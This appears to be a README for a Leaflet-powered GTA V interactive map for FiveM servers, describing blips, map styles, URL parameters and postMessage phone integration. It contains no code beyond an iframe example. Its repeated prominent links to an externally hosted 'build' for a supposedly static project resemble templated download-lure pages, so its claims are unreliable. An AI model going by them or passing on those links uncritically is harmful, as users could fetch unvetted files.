# GTA V Map Leaflet - Interactive Map for FiveM

> **A browser-first interactive map for GTA V roleplay servers, powered by Leaflet. Shows player location, blips, and several map styles with live updates.**

[![Interactive Map](https://img.shields.io/badge/Type-Interactive%20Map-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-priceik7953/gta-v-interactive-map?style=flat-square)](https://github.com/logan-priceik7953/gta-v-interactive-map)

---

<p align="center">
  <a href="https://logan-priceik7953.github.io/gta-v-interactive-map/">
    <img src="https://img.shields.io/badge/Download-GTA%20V%20Map%20Leaflet-brightgreen?style=for-the-badge" alt="Download GTA V Map Leaflet">
  </a>
</p>

> **[Direct Download - GTA V Map Leaflet](https://logan-priceik7953.github.io/gta-v-interactive-map/)**

---

[Download Latest Build](https://logan-priceik7953.github.io/gta-v-interactive-map/)

---

## What it does

GTA V Map Leaflet adds a lightweight Leaflet-driven mapping layer for FiveM and other GTA V roleplay setups. It presents Los Santos and Blaine County in a browser, then overlays the active player with a puck marker and a facing cone so orientation is easy to read at a glance. Blip images are loaded from the `blips/` directory, which makes it straightforward to swap or expand location markers for different server layouts.

This release puts extra attention on URL parameter parsing and `postMessage` support for 0r-phone compatibility. It also includes several map styles, giving users the choice between satellite, street, and hybrid layers. For administrators and players alike, it offers a simple web-based way to follow positions and points of interest without needing to stay in-game.

---

## Features

- Leaflet-powered interactive map with fluid panning and zooming
- Player indicator with puck marker and directional cone for heading
- Custom blip PNG assets loaded from the `blips/` folder
- URL parameter handling for sharing map states or coordinates
- `postMessage` integration for 0r-phone communication
- Multiple map styles: satellite, street, and hybrid
- Small HTML/JS footprint with no heavy runtime dependencies
- Simple to deploy on GitHub Pages or any static web host

---

## Installation

1. Download the latest build from the link above.
2. Extract the files to a folder named `gta-v-interactive-map`.
3. Upload the folder to your web server or GitHub Pages repository.
4. Place your custom blip PNGs in the `blips/` subfolder.
5. Open `index.html` in a browser or embed it via iframe in your FiveM resource.

Example embed:
```html
<iframe src="https://your-server.com/gta-v-interactive-map/" width="800" height="600"></iframe>
```

---

## Configuration

| Setting | Description | Default |
|---------|-------------|---------|
| `?lat=` | Initial latitude for map center | 0 |
| `?lng=` | Initial longitude for map center | 0 |
| `?zoom=` | Zoom level (1-18) | 13 |
| `?style=` | Map style: `satellite`, `street`, or `hybrid` | `street` |
| `?blips=` | Enable or disable blip overlay | `true` |

Example URL: `https://your-server.com/?lat=34.0&lng=-118.0&zoom=14&style=satellite`

---

## Compatibility

- Works in modern browsers (Chrome, Firefox, Edge, Safari)
- Designed for FiveM roleplay servers
- Supports 0r-phone integration via `postMessage`
- Map styles may vary based on tile provider availability
- Blip visibility depends on PNG files in `blips/` folder

---

## FAQ

**How do I get the map running on my server?**  
Grab the files, put them in a web-accessible location, and point your FiveM resource to the map URL for embedding.

**Will player positions refresh on their own?**  
Yes. With 0r-phone or another compatible script, the map receives live position data through `postMessage`.

**Can I change the blips?**  
Yes. You can replace the PNG files in `blips/` with your own artwork, as long as the filenames stay aligned or the code references are updated.

**Which map styles are supported?**  
Satellite, street, and hybrid are available. You can change the style through the URL parameter or from in-script controls.

**Does it work with other FiveM phone scripts?**  
Because it relies on standard `postMessage` events, it can be adapted to other phone scripts with only minor changes.

**Where do the map tiles come from?**  
The tiles are fetched from public tile providers. Nothing is stored locally.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
